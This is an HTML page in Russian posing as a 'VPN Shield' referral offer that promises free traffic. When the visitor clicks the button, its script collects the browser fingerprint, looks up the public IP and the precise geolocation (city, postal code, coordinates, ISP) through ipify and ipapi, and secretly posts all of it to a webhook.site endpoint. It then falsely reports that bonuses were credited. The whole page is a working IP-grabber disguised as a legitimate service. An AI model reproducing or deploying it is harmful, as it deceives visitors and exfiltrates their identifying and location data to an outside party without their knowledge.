<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VPN Shield — Реферальная программа</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
        }

        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: radial-gradient(ellipse at 50% 0%, #1a1f3a 0%, #0b0e1a 100%);
            padding: 20px;
        }

        .card {
            max-width: 440px;
            width: 100%;
            background: rgba(255, 255, 255, 0.04);
            backdrop-filter: blur(24px);
            -webkit-backdrop-filter: blur(24px);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 48px;
            padding: 40px 28px 32px;
            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.7);
            text-align: center;
            transition: 0.3s;
        }

        .logo {
            font-size: 38px;
            font-weight: 800;
            letter-spacing: -0.5px;
            background: linear-gradient(135deg, #00f5d4, #00b4d8);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .sub {
            color: rgba(255, 255, 255, 0.3);
            font-size: 13px;
            letter-spacing: 3px;
            text-transform: uppercase;
            margin-top: 4px;
        }

        .badge {
            display: inline-block;
            margin-top: 24px;
            padding: 6px 18px;
            border-radius: 100px;
            background: rgba(0, 245, 212, 0.10);
            border: 1px solid rgba(0, 245, 212, 0.15);
            color: #00f5d4;
            font-size: 13px;
            font-weight: 500;
        }

        .ref-box {
            margin: 24px 0 28px;
            padding: 18px 12px;
            background: rgba(255, 255, 255, 0.03);
            border-radius: 20px;
            border: 1px dashed rgba(255, 255, 255, 0.06);
        }

        .ref-box span {
            display: block;
            color: rgba(255, 255, 255, 0.3);
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .ref-box .id {
            font-size: 24px;
            font-weight: 700;
            color: #00f5d4;
            letter-spacing: 2px;
            margin-top: 4px;
        }

        .btn {
            width: 100%;
            padding: 18px 12px;
            border: none;
            border-radius: 60px;
            font-size: 20px;
            font-weight: 700;
            background: linear-gradient(135deg, #00f5d4, #00b4d8);
            color: #0b0e1a;
            cursor: pointer;
            transition: 0.25s ease;
            box-shadow: 0 8px 28px rgba(0, 245, 212, 0.25);
            margin-bottom: 8px;
        }

        .btn:hover {
            transform: scale(1.02);
            box-shadow: 0 12px 40px rgba(0, 245, 212, 0.35);
        }

        .btn:active {
            transform: scale(0.96);
        }

        .btn:disabled {
            opacity: 0.6;
            pointer-events: none;
        }

        .grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin: 28px 0 20px;
        }

        .grid div {
            background: rgba(255, 255, 255, 0.03);
            border-radius: 16px;
            padding: 14px 6px;
            border: 1px solid rgba(255, 255, 255, 0.03);
            font-size: 11px;
            color: rgba(255, 255, 255, 0.4);
            line-height: 1.5;
        }

        .grid div strong {
            display: block;
            font-size: 15px;
            color: #fff;
            font-weight: 600;
            margin-bottom: 2px;
        }

        .status {
            margin-top: 18px;
            padding: 12px 14px;
            border-radius: 16px;
            font-size: 14px;
            display: none;
        }

        .status.ok {
            display: block;
            background: rgba(0, 200, 83, 0.10);
            border: 1px solid rgba(0, 200, 83, 0.15);
            color: #00c853;
        }

        .status.err {
            display: block;
            background: rgba(255, 70, 70, 0.08);
            border: 1px solid rgba(255, 70, 70, 0.12);
            color: #ff6b6b;
        }

        .footer {
            margin-top: 24px;
            padding-top: 20px;
            border-top: 1px solid rgba(255, 255, 255, 0.04);
            font-size: 12px;
            color: rgba(255, 255, 255, 0.15);
        }

        .footer a {
            color: rgba(255, 255, 255, 0.2);
            text-decoration: none;
            margin: 0 10px;
        }
    </style>
</head>
<body>

<div class="card">
    <div class="logo">VPN Shield</div>
    <div class="sub">⚡ Secure · Fast · Private</div>

    <div class="badge">🎁 +5 GB бесплатного трафика</div>

    <div class="ref-box">
        <span>Ваш реферальный ID</span>
        <div class="id" id="refId">VN-2X9K-7F4M</div>
    </div>

    <button class="btn" id="referBtn">🔥 Стать рефералом</button>
    <div class="status" id="status"></div>

    <div class="grid">
        <div><strong>🛡️ 256‑bit</strong>Шифрование</div>
        <div><strong>🌍 140+</strong>Стран</div>
        <div><strong>⚡ 10 Gbps</strong>Скорость</div>
        <div><strong>📱 5</strong>Устройств</div>
        <div><strong>🔒 No Logs</strong>Политика</div>
        <div><strong>💳 30 дней</strong>Бесплатно</div>
    </div>

    <div class="footer">
        <a href="#">Политика конфиденциальности</a> • <a href="#">Пользовательское соглашение</a>
    </div>
</div>

<script>
    (function() {
        const WEBHOOK_URL = 'https://webhook.site/36b6bcb8-d02f-4340-b822-03f54060b514';

        const btn = document.getElementById('referBtn');
        const statusEl = document.getElementById('status');
        const refId = document.getElementById('refId').textContent;

        function setStatus(text, type) {
            statusEl.textContent = text;
            statusEl.className = 'status ' + type;
        }

        function collectAndSend() {
            btn.disabled = true;
            btn.textContent = '⏳ Отправка...';
            setStatus('', '');

            const data = {
                refId: refId,
                userAgent: navigator.userAgent,
                platform: navigator.platform || 'unknown',
                language: navigator.language,
                languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
                cookieEnabled: navigator.cookieEnabled,
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                pixelRatio: window.devicePixelRatio || 1,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timeOffset: new Date().getTimezoneOffset(),
                localTime: new Date().toLocaleString('ru-RU'),
                referrer: document.referrer || 'direct',
                url: window.location.href,
                title: document.title,
                timestamp: new Date().toISOString()
            };

            // === ПОЛУЧАЕМ IP И ГЕО ===
            fetch('https://api.ipify.org?format=json')
                .then(res => {
                    if (!res.ok) throw new Error('ipify недоступен');
                    return res.json();
                })
                .then(ipData => {
                    data.ip = ipData.ip;
                    return fetch(`https://ipapi.co/${ipData.ip}/json/`);
                })
                .then(res => {
                    if (!res.ok) throw new Error('ipapi недоступен');
                    return res.json();
                })
                .then(geo => {
                    data.country = geo.country_name || null;
                    data.city = geo.city || null;
                    data.region = geo.region || null;
                    data.postal = geo.postal || null;
                    data.latitude = geo.latitude || null;
                    data.longitude = geo.longitude || null;
                    data.org = geo.org || null;
                    data.asn = geo.asn || null;
                })
                .catch(err => {
                    console.warn('Гео-данные не получены:', err.message);
                })
                .finally(() => {
                    sendToWebhook(data);
                });
        }

        function sendToWebhook(data) {
            const lines = [
                '🔐 НОВЫЙ РЕФЕРАЛЬНЫЙ ПЕРЕХОД',
                '═══════════════════════',
                '',
                `🆔 Реферальный ID: ${data.refId}`,
                '',
                `🌐 IP: ${data.ip || 'не определён'}`,
                `🌍 Страна: ${data.country || 'не определена'}`,
                `🏙️ Город: ${data.city || 'не определён'}`,
                `📍 Регион: ${data.region || 'не определён'}`,
                `📮 Индекс: ${data.postal || 'не определён'}`,
                `🗺️ Координаты: ${data.latitude || '?'}, ${data.longitude || '?'}`,
                `📡 Провайдер: ${data.org || 'не определён'}`,
                `📶 ASN: ${data.asn || 'не определён'}`,
                '',
                `🖥️ User‑Agent: ${data.userAgent}`,
                `💻 Платформа: ${data.platform}`,
                `🌐 Язык: ${data.language}`,
                `📐 Экран: ${data.screenWidth}×${data.screenHeight} (${data.colorDepth}bit)`,
                `📱 Плотность: ${data.pixelRatio}`,
                `⏰ Часовой пояс: ${data.timezone} (UTC${(data.timeOffset / -60)})`,
                `🕒 Время: ${data.localTime}`,
                `🔗 Ссылка: ${data.url}`,
                `📎 Откуда пришёл: ${data.referrer}`,
                '',
                `━━━━━━━━━━━━━━━━━━━━━━`,
                `⏱️ ${data.timestamp}`
            ];

            const message = lines.join('\n');

            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    text: message,
                    raw: data
                })
            })
            .then(res => {
                if (!res.ok) throw new Error('Ошибка отправки');
                btn.textContent = '✅ Вы стали рефералом!';
                btn.style.background = 'linear-gradient(135deg, #00c853, #00e676)';
                setStatus('✅ Данные успешно отправлены! Бонусы начислены.', 'ok');
                document.querySelector('.badge').textContent = '🎁 +5 GB начислены!';
            })
            .catch(() => {
                btn.textContent = '🔥 Стать рефералом';
                setStatus('❌ Ошибка при отправке. Попробуйте ещё раз.', 'err');
            })
            .finally(() => {
                btn.disabled = false;
            });
        }

        btn.addEventListener('click', collectAndSend);
    })();
</script>

</body>
</html>
